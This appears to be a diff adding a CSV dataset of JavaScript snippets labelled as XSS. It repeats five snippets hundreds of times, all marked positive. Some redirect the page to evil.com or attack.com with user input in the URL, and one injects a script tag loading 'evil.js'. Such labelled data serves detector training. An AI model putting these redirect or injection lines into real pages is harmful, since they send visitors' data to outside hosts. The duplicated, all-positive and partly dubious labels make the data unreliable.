@@ -1,0 +1,501 @@
+payload,xss
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+alert('Hello ' + user_input);,1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
+alert('Hello ' + user_input);,1
+document.getElementById('input').innerHTML = user_input;,1
+alert('Hello ' + user_input);,1
+"document.write('<script src=""evil.js""></script>');",1
+"document.write('<script src=""evil.js""></script>');",1
+document.location = 'http://evil.com?username=' + user_input;,1
+document.getElementById('input').innerHTML = user_input;,1
+document.location = 'http://evil.com?username=' + user_input;,1
+alert('Hello ' + user_input);,1
+window.location.href = 'http://attack.com?user=' + user_input;,1
+alert('Hello ' + user_input);,1
